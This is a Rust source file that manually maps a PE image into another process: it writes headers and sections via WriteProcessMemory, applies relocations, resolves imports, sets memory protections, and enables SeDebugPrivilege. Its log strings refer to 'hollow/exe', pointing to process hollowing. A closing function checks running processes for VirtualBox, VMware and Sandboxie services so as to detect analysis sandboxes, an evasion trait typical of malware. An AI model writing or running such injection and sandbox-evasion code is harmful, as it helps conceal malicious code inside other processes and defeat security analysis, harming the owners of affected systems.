use windows::Win32::{Foundation::*, Security::{AdjustTokenPrivileges, LookupPrivilegeValueA, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY}, System::{Diagnostics::{Debug::*, ToolHelp::*}, LibraryLoader::*, Memory::{VirtualProtectEx, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE}, Threading::*}};
use windows_strings::PCSTR;
use std::ffi::c_void;
use crate::PluginApp;
use anyhow::Context;

impl PluginApp {
    pub fn get_dll_main_rva(dll_data: &[u8]) -> anyhow::Result<u32, anyhow::Error> {
        use goblin::pe::PE;
        let pe = PE::parse(dll_data)?;
        Ok(pe.header.optional_header.unwrap().standard_fields.address_of_entry_point)
    }

    pub fn parse_pe_headers(dll_data: &[u8]) -> anyhow::Result<(usize, u32, usize), anyhow::Error> {
        use goblin::pe::PE;
        let pe = PE::parse(dll_data)?;
        let opt = pe.header.optional_header.ok_or_else(|| anyhow::anyhow!("Missing optional header"))?;
        let preferred_base = opt.windows_fields.image_base as usize;
        let entry_rva = opt.standard_fields.address_of_entry_point;
        let size_of_image = opt.windows_fields.size_of_image as usize;
        Ok((preferred_base, entry_rva, size_of_image))
    }

    pub fn map_pe_sections(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<(), anyhow::Error> {
        use goblin::pe::PE;
        let pe = PE::parse(dll_data)?;
        let size_of_headers = pe.header.optional_header
            .map(|opt| opt.windows_fields.size_of_headers as usize)
            .unwrap_or(0);
        unsafe {
            // Write headers
            WriteProcessMemory(
                process_handle,
                base_addr,
                dll_data.as_ptr() as _,
                size_of_headers,
                None,
            ).map_err(|e| anyhow::anyhow!("Failed to write headers: {}", e))?;

            // Map sections
            for (i, section) in pe.sections.iter().enumerate() {
                let virtual_address = section.virtual_address as usize;
                let size_of_raw_data = section.size_of_raw_data as usize;
                let pointer_to_raw_data = section.pointer_to_raw_data as usize;
                if size_of_raw_data > 0 && pointer_to_raw_data > 0 {
                    WriteProcessMemory(
                        process_handle,
                        (base_addr as usize + virtual_address) as *mut _,
                        dll_data.as_ptr().add(pointer_to_raw_data) as _,
                        size_of_raw_data,
                        None,
                    ).map_err(|e| anyhow::anyhow!("Failed to write section {}: {}", i, e))?;
                }
            }
        }
        Ok(())
    }

    pub fn apply_relocations(pe_data: &[u8], process_handle: HANDLE, new_base: usize, preferred_base: usize) -> anyhow::Result<()> {
        use goblin::pe::PE;
        let pe = PE::parse(pe_data)?;
        let delta = new_base.wrapping_sub(preferred_base);
        if delta == 0 { return Ok(()); }
        // IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
        let reloc_dir = pe.header.optional_header
            .as_ref()
            .and_then(|opt| opt.data_directories.get_base_relocation_table())
            .ok_or_else(|| anyhow::anyhow!("No relocation directory found"))?;
        if reloc_dir.virtual_address == 0 || reloc_dir.size == 0 { return Ok(()); }
        let mut offset = PluginApp::rva_to_offset(pe_data, reloc_dir.virtual_address as usize)?;
        let end = offset + reloc_dir.size as usize;
        // Get image size for bounds checking
        let image_size = pe.header.optional_header
            .map(|opt| opt.windows_fields.size_of_image as usize)
            .unwrap_or(0);
        while offset < end {
            let page_rva = u32::from_le_bytes(pe_data[offset..offset + 4].try_into()?);
            let block_size = u32::from_le_bytes(pe_data[offset + 4..offset + 8].try_into()?);
            if block_size == 0 { break; }
            let entries_count = (block_size as usize - 8) / 2;
            for i in 0..entries_count {
                let entry_offset = offset + 8 + i * 2;
                let entry = u16::from_le_bytes(pe_data[entry_offset..entry_offset + 2].try_into()?);
                let reloc_type = entry >> 12;
                let offset_in_page = entry & 0xFFF;
                let reloc_addr = new_base + page_rva as usize + offset_in_page as usize;
                // Bounds check: skip if reloc_addr is outside the mapped image
                if reloc_addr < new_base || reloc_addr + 8 > new_base + image_size {
                    println!("[reloc][warn] Skipping relocation: address 0x{:X} out of bounds (image base=0x{:X}, size=0x{:X})", reloc_addr, new_base, image_size);
                    continue;
                }
                match reloc_type {
                    3 => { // IMAGE_REL_BASED_HIGHLOW (32-bit)
                        let mut original_value = 0u32;
                        unsafe { ReadProcessMemory(process_handle, reloc_addr as *const _, &mut original_value as *mut _ as *mut c_void, 4, None) }?;
                        let new_value = original_value.wrapping_add(delta as u32);
                        unsafe { WriteProcessMemory(process_handle, reloc_addr as *mut _, &new_value as *const _ as *const c_void, 4, None) }?;
                    },
                    10 => { // IMAGE_REL_BASED_DIR64 (64-bit)
                        let mut original_value = 0u64;
                        unsafe { ReadProcessMemory(process_handle, reloc_addr as *const _, &mut original_value as *mut _ as *mut c_void, 8, None) }?;
                        let new_value = original_value.wrapping_add(delta as u64);
                        unsafe { WriteProcessMemory(process_handle, reloc_addr as *mut _, &new_value as *const _ as *const c_void, 8, None) }?;
                    },
                    0 => {}, // IMAGE_REL_BASED_ABSOLUTE (skip)
                    _ => println!("[reloc][warn] Unhandled relocation type: {}", reloc_type),
                }
            }
            offset += block_size as usize;
        }
        Ok(())
    }

    pub fn resolve_imports(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<(), anyhow::Error> {
        use goblin::pe::PE;
        let pe = PE::parse(dll_data)?;
        for import in &pe.imports {
            let dll_name = import.dll;
            println!("[hollow/exe] Loading DLL: {}", dll_name);
            let h_module = unsafe {
                GetModuleHandleA(PCSTR(format!("{}\0", dll_name).as_ptr()))
                    .or_else(|_| {
                        println!("[hollow/exe] DLL not loaded, attempting to load: {}", dll_name);
                        LoadLibraryA(PCSTR(format!("{}\0", dll_name).as_ptr()))
                    })
            }.map_err(|e| anyhow::anyhow!("Failed to load {}: {}", dll_name, e))?;
            let iat_addr = (base_addr as usize + import.rva as usize) as *mut u64;
            let func_addr = unsafe {
                if !import.name.is_empty() {
                    GetProcAddress(h_module, PCSTR(format!("{}\0", import.name).as_ptr()))
                } else if import.name.is_empty() {
                    // Ordinals should be passed as MAKEINTRESOURCE (u16) cast to LPCSTR
                    GetProcAddress(h_module, PCSTR(import.ordinal as usize as *const u8))
                } else {
                    None
                }
            };
            if let Some(addr) = func_addr {
                println!("[hollow/exe] Resolved function at: 0x{:X}", addr as usize);
                unsafe {
                    WriteProcessMemory(
                        process_handle,
                        iat_addr as _,
                        &(addr as u64) as *const _ as _,
                        8,
                        None,
                    ).map_err(|e| anyhow::anyhow!("Failed to write IAT entry: {}", e))?;
                }
            } else {
                println!("[hollow/exe] Failed to resolve function, leaving as zero");
            }
        }
        Ok(())
    }

    /// Get the base address of a module in a remote process
    pub unsafe fn get_remote_module_base(process_handle: HANDLE, module_name: &str) -> anyhow::Result<usize, anyhow::Error> {
        let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetProcessId(process_handle)) }?;
        
        let mut module_entry = MODULEENTRY32W::default();
        module_entry.dwSize = std::mem::size_of::<MODULEENTRY32W>() as u32;
        
        if unsafe { Module32FirstW(snapshot, &mut module_entry).is_ok() } {
            loop {
                let current_name = String::from_utf16_lossy(&module_entry.szModule)
                    .trim_end_matches('\0')
                    .to_lowercase();
                
                if current_name == module_name.to_lowercase() {
                    unsafe { CloseHandle(snapshot).ok() };
                    return Ok(module_entry.modBaseAddr as usize);
                }
                
                if unsafe { Module32NextW(snapshot, &mut module_entry).is_err() } {
                    break;
                }
            }
        }
        
        unsafe { CloseHandle(snapshot).ok() };
        Err(anyhow::anyhow!("Module {} not found in target process", module_name))
    }

    pub fn get_remote_module_base_from_pid(pid: u32, module_name: &str) -> Option<*mut std::ffi::c_void> {
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid).ok()?;
            let mut entry = MODULEENTRY32 {
                dwSize: std::mem::size_of::<MODULEENTRY32>() as u32,
                ..Default::default()
            };

            if Module32First(snapshot, &mut entry).is_ok() {
                loop {
                    let name = std::ffi::CStr::from_ptr(entry.szModule.as_ptr())
                        .to_string_lossy()
                        .to_lowercase();
                    if name == module_name.to_lowercase() {
                        return Some(entry.modBaseAddr as _);
                    }
                    if !Module32Next(snapshot, &mut entry).is_ok() {
                        break;
                    }
                }
            }
            None
        }
    }  
}

/// Sets the correct memory protections for each section of the mapped image.
pub fn set_section_protections(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<(), anyhow::Error> {
    use goblin::pe::PE;
    let pe = PE::parse(dll_data)?;
    let size_of_image = pe.header.optional_header
        .map(|opt| opt.windows_fields.size_of_image as usize)
        .unwrap_or(0);
    println!("Allocated image range: 0x{:X} - 0x{:X}", base_addr as usize, base_addr as usize + size_of_image);
    for (i, section) in pe.sections.iter().enumerate() {
        let name_str = String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes());
        let virtual_address = section.virtual_address as usize;
        let virtual_size = section.virtual_size as usize;
        let raw_size = section.size_of_raw_data as usize;
        let characteristics = section.characteristics;
        println!("Section {}: name='{}'", i, name_str);
        println!("  virtual_address=0x{:X}", virtual_address);
        println!("  virtual_size=0x{:X}", virtual_size);
        println!("  raw_size=0x{:X}", raw_size);
        println!("  characteristics=0x{:X}", characteristics);
        let size = std::cmp::max(virtual_size, raw_size);
        if size == 0 {
            println!("[protect] Skipping section {}: zero size", i);
            continue;
        }
        if virtual_address == 0 {
            println!("[protect] Skipping section {}: zero virtual address", i);
            continue;
        }
        if virtual_address + size > size_of_image {
            println!("[protect] Skipping section {}: out-of-bounds (addr=0x{:X}, size=0x{:X}, image=0x{:X})", i, virtual_address, size, size_of_image);
            continue;
        }
        if size > 0x1000000 {
            println!("[protect] Skipping section {}: absurd size (0x{:X})", i, size);
            continue;
        }
        if characteristics & 0x02000000 != 0 {
            println!("[protect] Skipping section {}: discardable", i);
            continue;
        }
        let protection = if characteristics & 0x20000000 != 0 { // IMAGE_SCN_MEM_EXECUTE
            if characteristics & 0x80000000 != 0 { // IMAGE_SCN_MEM_WRITE
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            }
        } else if characteristics & 0x80000000 != 0 { // IMAGE_SCN_MEM_WRITE
            PAGE_READWRITE
        } else {
            PAGE_READONLY
        };
        println!("protection: {:X}", protection.0);
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        let remote_addr = (base_addr as usize + virtual_address) as *mut _;
        println!("Calling VirtualProtectEx: addr=0x{:X}, size=0x{:X}, protection=0x{:X}", remote_addr as usize, size, protection.0);
        unsafe {
            VirtualProtectEx(
                process_handle,
                remote_addr,
                size,
                protection,
                &mut old_protect,
            )
            .context("VirtualProtectEx")
            .map_err(|e| anyhow::anyhow!("Error with VirtualProtectEx: {e:?}"))?;
        }
    }
    Ok(())
}

/// Converts a Relative Virtual Address (RVA) to a file offset.
pub fn rva_to_offset(pe_data: &[u8], rva: usize) -> anyhow::Result<usize> {
    use goblin::pe::PE;
    let pe = PE::parse(pe_data)?;
    for section in &pe.sections {
        let va = section.virtual_address as usize;
        let vsz = section.virtual_size as usize;
        if rva >= va && rva < va + vsz {
            return Ok((rva - va) + section.pointer_to_raw_data as usize);
        }
    }
    if let Some(opt) = pe.header.optional_header {
        if rva < opt.windows_fields.size_of_headers as usize {
            return Ok(rva);
        }
    }
    Err(anyhow::anyhow!("RVA 0x{:X} not found in any section or header", rva))
}

// Enable SeDebugPrivilege for the current process
pub fn enable_debug_privilege() -> anyhow::Result<(), anyhow::Error> {
    unsafe {
        let mut h_token: HANDLE = HANDLE(std::ptr::null_mut());

        OpenProcessToken(
            GetCurrentProcess(), 
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
            &mut h_token
        ).context("OpenProcessToken failed")?;

        let mut luid = LUID::default();

        LookupPrivilegeValueA(
            None, 
            PCSTR(b"SeDebugPrivilege\0".as_ptr()), 
            &mut luid
        ).context("LookupPrivilegeValueA failed")?;

        let tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [windows::Win32::Security::LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }; 1],
        };
        
        AdjustTokenPrivileges(h_token, false, Some(&tp), 0, None, None).context("AdjustTokenPrivileges failed")?;
    }
    Ok(())
}

// Helper function to detect analysis environments
pub fn detect_analysis_environment() -> bool {
    unsafe {
        // Check for common VM/sandbox indicators
        let indicators = [
            "VBoxService.exe",
            "vmtoolsd.exe", 
            "vmsrvc.exe",
            "vboxservice.exe",
            "sandboxiedcomlaunch.exe",
            "sbiesvc.exe",
        ];

        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if let Ok(snapshot) = snapshot {
            let mut entry = PROCESSENTRY32 {
                dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
                ..Default::default()
            };

            if Process32First(snapshot, &mut entry).is_ok() {
                loop {
                    let name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr())
                        .to_string_lossy()
                        .to_lowercase();
                    
                    for indicator in &indicators {
                        if name.contains(&indicator.to_lowercase()) {
                            return true;
                        }
                    }

                    if !Process32Next(snapshot, &mut entry).is_ok() {
                        break;
                    }
                }
            }
        }
    }
    false
}


